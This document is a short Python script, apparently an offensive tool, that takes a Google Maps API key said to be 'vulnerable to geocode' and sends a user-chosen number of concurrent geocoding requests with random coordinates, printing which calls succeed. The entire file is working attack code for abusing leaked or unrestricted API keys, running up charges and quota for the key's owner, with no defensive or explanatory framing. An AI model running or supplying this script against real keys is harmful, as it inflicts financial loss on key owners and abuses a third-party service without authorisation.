#!/usr/bin/python3
import grequests, warnings, json, sys, os, random, colorama
from colorama import Fore
colorama.init(autoreset=True)

def exception_handler(request, exception):
    print(Fore.RED + "Request Failed.")

def generate_url(apikey):
    lat_a = random.randrange(-89,90)
    lat_b = random.randrange(0,100000)
    lng_a = random.randrange(-89,90)
    lng_b = random.randrange(0,100000)
    return f"https://maps.googleapis.com/maps/api/geocode/json?latlng={lat_a}.{lat_b},{lng_a}.{lng_b}&key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to geocode: "))
    count = int(input("Enter packet count: "))
    print (Fore.GREEN + "[+] Sending Packets")
    urls = list()
    for i in range(count):
        url = generate_url(apikey)
        urls.append(url)

    responses = (grequests.get(u) for u in urls)
    result_map = grequests.map(responses, exception_handler=exception_handler)
    for result in result_map:
        if result.text.find("error_message") < 0:
            print(Fore.GREEN + f"[+] Packet sequence-{result_map.index(result) + 1} Succeed: No Error Message")
        else:
            print(Fore.RED + f"[-] Packet sequence-{result_map.index(result) + 1} Failed: Error Message Exist")

if __name__ == "__main__":
    do_attack()

